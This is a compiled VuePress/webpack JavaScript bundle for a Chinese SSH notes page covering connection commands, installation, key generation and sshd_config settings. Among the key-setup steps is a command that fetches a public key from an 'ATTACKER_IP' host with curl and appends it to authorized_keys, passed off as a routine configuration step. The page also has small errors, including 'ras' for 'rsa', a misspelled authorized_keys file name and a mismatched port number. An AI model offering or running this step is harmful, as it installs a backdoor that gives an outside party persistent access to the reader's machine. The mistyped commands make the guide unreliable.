(window.webpackJsonp=window.webpackJsonp||[]).push([[19],{383:function(s,t,a){"use strict";a.r(t);var e=a(25),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"ssh"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ssh"}},[s._v("#")]),s._v(" SSH")]),s._v(" "),a("h2",{attrs:{id:"基础命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#基础命令"}},[s._v("#")]),s._v(" 基础命令")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 直接连接")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" username@ip\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 使用非默认端口")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" username@domain -p port\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 使用代理主机")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -J proxy-server:22 target-server \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 将服务器的 2222 端口转发到本地的 3333 端口 ")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -R "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2222")]),s._v(":localhost:333 username@domain \n")])])]),a("h2",{attrs:{id:"安装"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安装"}},[s._v("#")]),s._v(" 安装")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Client:")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt-get")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Server:")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("apt-get")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v(" openssh-server\n")])])]),a("h2",{attrs:{id:"生成密钥"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#生成密钥"}},[s._v("#")]),s._v(" 生成密钥")]),s._v(" "),a("ol",[a("li",[a("code",[s._v('ssh-keygen -t ras -C "email"')])]),s._v(" "),a("li",[s._v("位置：\n"),a("ul",[a("li",[s._v("私钥："),a("code",[s._v("~/.ssh/id_rsa")])]),s._v(" "),a("li",[s._v("公钥："),a("code",[s._v("~/.ssh/id_rsa.pub")])])])]),s._v(" "),a("li",[s._v("Git 服务密钥配置地址：\n"),a("ul",[a("li",[a("a",{attrs:{href:"https://github.com/settings/keys",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://github.com/settings/keys"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://gitee.com/profile/sshkeys",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://gitee.com/profile/sshkeys"),a("OutboundLink")],1)])])]),s._v(" "),a("li",[s._v("写入主机的 authorized_keys：\n"),a("code",[s._v("curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys")])])]),s._v(" "),a("p",[s._v("我的公钥：")]),s._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj8b9SWuI/oKquMiy+vOSOOcokMF6XkUkc7TlX33bIy3xK5l8rgJ2CAJ+xORAA2JJzwXdu8AMDsFfk8DHMj7kcs/K505iMpiIGhUWHXkl+UiIhD+B/v9KIv4jQQF9wmJR/jaw8MdHyUXZA2maV6sY41swoRPyAtYb6HW/32pWsqsDq2DeQQyARqiPpV0pcFV3BXK0nOBl8+W9HjP8rYBFbXIfpXTvhSrzOz+NXoV8E8/w7/jD5YDPbMQ16FPQzk3CVT4pUL4x1nOqxFgvLbiwfPsAWF6a2Lr6A8ZcU5AUI2GC5+X6r47KlGUl0mtTOkarBkJ91+a//JFHmstrLrKyV JustSong@MyPC\n")])])]),a("p",[s._v("可以使用 "),a("code",[s._v("ssh-copy-id username@remote_host")]),s._v(" 很方便地为远超主机配置密钥访问。\n如果需要指定公钥，使用 "),a("code",[s._v("-i")]),s._v(" 即可。\n如果需要指定端口，使用 "),a("code",[s._v("-p")]),s._v(" 即可。")]),s._v(" "),a("h2",{attrs:{id:"配置"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#配置"}},[s._v("#")]),s._v(" 配置")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vi")]),s._v(" /etc/ssh/sshd_config \n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## 允许root登录 ")]),s._v("\nPermitRootLogin "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v(" \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## 使用密钥登录 ")]),s._v("\nRSAAuthentication "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v(" \nPubkeyAuthentication "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v(" \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## 禁止空密码和密码登录 ")]),s._v("\nPermitEmptyPasswords no \nPasswordAuthentication no \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("## 监听端口（一般默认是 22，或者是自己已开的端口，不改即可） ")]),s._v("\nPort "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v(" \n")])])]),a("p",[s._v("修改完配置之后重启以应用更改："),a("code",[s._v("sudo service ssh restart")])])])}),[],!1,null,null,null);t.default=n.exports}}]);